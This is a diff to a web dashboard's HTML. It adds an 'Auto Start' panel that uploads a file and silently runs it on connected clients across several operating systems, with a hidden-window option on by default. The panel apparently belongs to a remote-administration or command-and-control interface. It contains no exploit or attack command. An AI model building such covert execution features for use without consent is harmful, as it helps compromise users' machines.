@@ -13,6 +13,7 @@
       referrerpolicy="no-referrer"
     />
     <link rel="stylesheet" href="/assets/main.css" />
+    <link rel="stylesheet" href="/assets/custom.css" />
     <script src="/assets/toast.js"></script>
     <script src="/assets/ripple.js"></script>
   </head>
@@ -214,6 +215,127 @@
             >
               <div class="text-slate-500">
                 No commands dispatched yet.
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Auto Start -->
+        <div class="lg:col-span-3">
+          <div class="bg-slate-900/70 rounded-xl border border-slate-800 p-6">
+            <div class="flex items-center justify-between mb-4">
+              <div>
+                <h2 class="text-xl font-semibold">Auto Start</h2>
+                <p class="text-sm text-slate-400">
+                  Automatically deploy and run a file on clients when they connect
+                </p>
+              </div>
+            </div>
+
+            <div class="space-y-4">
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label class="block text-sm font-medium text-slate-300 mb-1">Task Name</label>
+                  <input
+                    id="auto-deploy-name"
+                    type="text"
+                    placeholder="e.g. Deploy monitoring agent"
+                    class="w-full px-4 py-2 rounded-lg border border-slate-700 bg-slate-950 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-500"
+                  />
+                </div>
+                <div>
+                  <label class="block text-sm font-medium text-slate-300 mb-1">Trigger</label>
+                  <select
+                    id="auto-deploy-trigger"
+                    class="w-full px-4 py-2 rounded-lg border border-slate-700 bg-slate-800 text-slate-100"
+                  >
+                    <option value="on_connect">On connect (every session)</option>
+                    <option value="on_connect_once">On connect (only once per client)</option>
+                    <option value="on_first_connect">On first connect (new clients only)</option>
+                  </select>
+                </div>
+              </div>
+
+              <div>
+                <label class="block text-sm font-medium text-slate-300 mb-1">File to Deploy</label>
+                <div
+                  id="auto-deploy-zone"
+                  class="border-2 border-dashed border-slate-700 rounded-xl p-4 bg-slate-950/60 hover:border-cyan-500 transition-colors cursor-pointer"
+                >
+                  <div class="flex items-center gap-4">
+                    <div class="w-10 h-10 rounded-full bg-cyan-900/40 flex items-center justify-center text-cyan-300">
+                      <i class="fa-solid fa-cloud-arrow-up text-sm"></i>
+                    </div>
+                    <div>
+                      <div class="font-semibold text-slate-100 text-sm">Drag & drop a file</div>
+                      <div class="text-xs text-slate-400">or click to select</div>
+                    </div>
+                  </div>
+                  <input id="auto-deploy-file-input" type="file" class="hidden" />
+                </div>
+                <div class="mt-1 text-xs text-slate-400" id="auto-deploy-file-status">No file selected</div>
+              </div>
+
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label class="block text-sm font-medium text-slate-300 mb-1">Arguments (optional)</label>
+                  <input
+                    id="auto-deploy-args"
+                    type="text"
+                    placeholder="e.g. /quiet /norestart"
+                    class="w-full px-4 py-2 rounded-lg border border-slate-700 bg-slate-950 text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-cyan-500"
+                  />
+                </div>
+                <div>
+                  <label class="block text-sm font-medium text-slate-300 mb-1">OS Filter <span class="text-slate-500">(unchecked = any)</span></label>
+                  <div class="flex flex-wrap gap-x-4 gap-y-1.5 mt-1">
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="windows" class="w-4 h-4 rounded accent-cyan-500"> Windows
+                    </label>
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="linux" class="w-4 h-4 rounded accent-cyan-500"> Linux
+                    </label>
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="darwin" class="w-4 h-4 rounded accent-cyan-500"> macOS
+                    </label>
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="android" class="w-4 h-4 rounded accent-cyan-500"> Android
+                    </label>
+                    <label class="flex items-center gap-1.5 text-sm text-slate-300 cursor-pointer">
+                      <input type="checkbox" name="auto-deploy-os" value="freebsd" class="w-4 h-4 rounded accent-cyan-500"> FreeBSD
+                    </label>
+                  </div>
+                </div>
+              </div>
+
+              <label class="flex items-center gap-3 rounded-lg border border-slate-800 bg-slate-950/60 px-4 py-3 text-sm text-slate-300">
+                <input id="auto-deploy-hide-window" type="checkbox" class="w-4 h-4 rounded border-slate-600 bg-slate-700" checked />
+                <div class="flex flex-col">
+                  <span class="font-semibold">Hide window (Windows)</span>
+                  <span class="text-xs text-slate-500">Runs without showing a console window.</span>
+                </div>
+              </label>
+
+              <div class="flex items-center gap-2">
+                <button
+                  id="auto-deploy-save-btn"
+                  class="px-5 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-700 text-white font-semibold flex items-center gap-2"
+                >
+                  <i class="fa-solid fa-bolt"></i> Save Auto Start
+                </button>
+                <button
+                  id="auto-deploy-cancel-btn"
+                  class="px-5 py-2 rounded-lg bg-slate-700 hover:bg-slate-600 text-white font-semibold hidden"
+                >
+                  Cancel
+                </button>
+              </div>
+            </div>
+
+            <div class="mt-6">
+              <div class="text-sm text-slate-400 mb-2">Active Auto Start Rules</div>
+              <div id="auto-deploy-list" class="space-y-2 max-h-96 overflow-auto">
+                <div class="text-slate-500 text-sm">Loading...</div>
               </div>
             </div>
           </div>
